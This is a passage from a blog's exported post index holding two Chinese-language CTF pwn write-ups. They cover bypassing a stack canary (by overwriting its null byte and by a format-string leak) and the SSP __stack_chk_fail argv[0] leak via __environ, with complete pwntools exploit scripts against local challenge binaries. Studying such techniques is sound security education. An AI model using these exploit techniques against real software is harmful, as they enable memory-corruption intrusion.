class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;1122&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./1122&#x27;</span>)<br><br>get_shell = ELF(<span class="hljs-string">&quot;./1122&quot;</span>).sym[<span class="hljs-string">&quot;getshell&quot;</span>]<br><br>io.recvuntil(<span class="hljs-string">&quot;Hello Hacker!\n&quot;</span>)<br><br><span class="hljs-comment"># leak Canary</span><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">100</span><br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">100</span>)<br>Canary = u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0xa</span><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br><br><span class="hljs-comment"># Bypass Canary</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">100</span>+p32(Canary)+<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">12</span>+p32(get_shell)<br>io.send(payload)<br><br>io.recv()<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>最后强调一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context.binary = <span class="hljs-string">&#x27;1122&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br></code></pre></td></tr></table></figure><p>这两行必须要有一个，否则无法运行</p><p>最后运行得到shell</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/6.png" class="">![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑**二、字符串漏洞泄露canary**<p>原理</p><ul><li>格式化字符串漏洞可以打印出栈中的内容，因此利用此漏洞可以打印出canary的值，从而进行<a href="https://so.csdn.net/so/search?q=%E6%A0%88%E6%BA%A2%E5%87%BA&spm=1001.2101.3001.7020">栈溢出</a></li></ul><p>还是上面那道题</p><p>这次来介绍一下另一种寻找偏移的办法</p><p>用gdb 调试</p><p>先用gdb在printf处下断点</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/7.png" class=""><p>找到第一个printf下的栈帧0xffffcf98</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/8.png" class=""><p>从ida上知道程序主要在vuln 函数里面</p><p>用gdb 运行文件并在函数下断点运行</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/10.png" class=""><p>发现有一段异或比较，可以判断canary 的值就在eax里面</p><p>不断步入到0x8049256</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/11.png" class=""><p>记住eax的值</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/12.png" class=""><p>发现canary存在地址0xc中</p><p>可以计算偏移</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/13.png" class=""><p>继续点n</p><p>到read 函数运行（这一步很重要,否则偏移不准确）</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/14.png" class=""><p>再次查看栈帧计算此时canary 到esp的偏移量</p><img src="/2024/02/20/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/15.png" class=""><p>因为程序是32位</p><p>4个字节一组就是31组</p><p>所以canary的偏移为31</p><p>这部分可参考</p><p><a href="https://www.freebuf.com/articles/system/233515.html">https://www.freebuf.com/articles/system/233515.html</a></p><p><a href="https://blog.csdn.net/glhdbk/article/details/100595050">https://blog.csdn.net/glhdbk/article/details/100595050</a></p><p>则payload1可构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload_1 = <span class="hljs-string">b&#x27;%x-&#x27;</span> * ( <span class="hljs-number">6</span> + <span class="hljs-number">25</span>)<br>conn.send(payload_1)<br>recvbytes = conn.recv()<br><br><span class="hljs-comment"># 获取canary</span><br>canary = <span class="hljs-built_in">int</span>(recvbytes.split(<span class="hljs-string">b&#x27;-&#x27;</span>)[-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure><p>泄露出canary的值</p><p>最后进行再一次栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload_2 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x70</span> - <span class="hljs-number">0xc</span>) + p32(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc</span>+ p32(getshell)<br></code></pre></td></tr></table></figure><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><br>conn = process(<span class="hljs-string">&#x27;./1122&#x27;</span>)<br><br>getshell = <span class="hljs-number">0x080491b6</span><br>conn.recvuntil(<span class="hljs-string">&#x27;Hello Hacker!\n&#x27;</span>)<br><br><span class="hljs-comment"># 第一次溢出</span><br>payload_1 = <span class="hljs-string">b&#x27;%x-&#x27;</span> * ( <span class="hljs-number">6</span> + <span class="hljs-number">25</span>)<br>conn.send(payload_1)<br>recvbytes = conn.recv()<br><br><span class="hljs-comment"># 获取canary</span><br>canary = <span class="hljs-built_in">int</span>(recvbytes.split(<span class="hljs-string">b&#x27;-&#x27;</span>)[-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Canary: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&#x27;</span>)<br><span class="hljs-comment"># 第二次溢出</span><br>payload_2 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x70</span> - <span class="hljs-number">0xc</span>) + p32(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc</span>+ p32(getshell)<br>conn.send(payload_2)<br>conn.recv()<br>conn.interactive()<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>]]></content>
      
      
      <categories>
          
          <category> 栈利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>canary_ssp泄露</title>
      <link href="/2024/02/13/canary-ssp%E6%B3%84%E9%9C%B2/"/>
      <url>/2024/02/13/canary-ssp%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="canary-ssp泄露"><a href="#canary-ssp泄露" class="headerlink" title="canary_ssp泄露"></a>canary_ssp泄露</h1><h6 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h6><p>当程序运行时检测到canary 被破坏，会执行<code>__stack_chk_fail</code>函数</p><p>并且打印</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">*** </span>stack smashing detected <span class="hljs-strong">***</span>:./pwn（程序名） terminated<br></code></pre></td></tr></table></figure><p><img src="/img/canary_ssp/a.png"></p><p>可以看到 程序名存在<code>__libc_argv[0]</code>，如果我们能够通过溢出覆盖掉<code>__libc_argv[0]</code>就可以实现任意地址泄露（高版本的<code>libc</code>取消了这个打印）</p><h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><p>这个泄露一般一直泄露<code>libc</code>的地址，想要泄露栈的地址，就需要用到<code>libc</code>中的__environ()函数</p><h6 id="environ-函数"><a href="#environ-函数" class="headerlink" title="__environ 函数"></a>__environ 函数</h6><p>这个函数是存储栈上的环境变量的，也就是说他的指向是栈地址，如果我知道想要泄露的flag在栈上与这个函数的偏移，就可以通过这个函数泄露出flag</p><p>例题：wdb_guss</p><p>丢入ida 可以看到有三个循环以及gets存在栈溢出</p><p>除此之外没有其他的洞</p><p><img src="/img/canary_ssp/b.png"></p><p><img src="/img/canary_ssp/c.png"></p><p>存在canary,并且flag已经存在栈上，那么可以用ssp攻击打印出flag</p><p>gdb调试找出输入点和指向<code>__libc_argv[0]的地址的指针</code></p><p><img src="/img/canary_ssp/d.png"></p><p><img src="/img/canary_ssp/e.png"></p><p>算出偏移</p><p><img src="/img/canary_ssp/f.png"></p><p>所以第一条payload 的构造为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(puts_got)<br></code></pre></td></tr></table></figure><p>泄露出libc后就可以得到environ的地址，从而得到栈上的地址</p><p>所以第二个payload 的构造为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">real=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(real))<br><br>base=real-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>environ=base+libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(environ))<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(environ)<br>io.sendline(payload2)<br></code></pre></td></tr></table></figure><p>最后gdb 调试出flag距离environ的偏移得到flag的地址</p><p><img src="/img/canary_ssp/g.png"></p><p>得到偏移为0x168</p><p>所以flag的地址为environ-0x168</p><p>所以第三条payload的构造为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">io.recvuntil(<span class="hljs-string">&#x27;stack smashing detected ***: &#x27;</span>)<br>buf_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x168</span><br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(buf_addr)<br>io.sendline(payload3)<br></code></pre></td></tr></table></figure><p>运行打印出flag</p><p><img src="/img/canary_ssp/h.png"></p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=process(<span class="hljs-string">&#x27;./GUESS&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./GUESS&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc1.so.6&#x27;</span>)<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>io.recvuntil(<span class="hljs-string">&quot;Please type your guessing flag&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(puts_got)<br>io.sendline(payload)<br>real=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(real))<br><br>base=real-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>environ=base+libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(environ))<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(environ)<br>io.sendline(payload2)<br>io.recvuntil(<span class="hljs-string">&#x27;stack smashing detected ***: &#x27;</span>)<br>buf_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x168</span><br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(buf_addr)<br>io.sendline(payload3)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>]]></content>
      
      
      <categories>
          
          <category> 栈利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
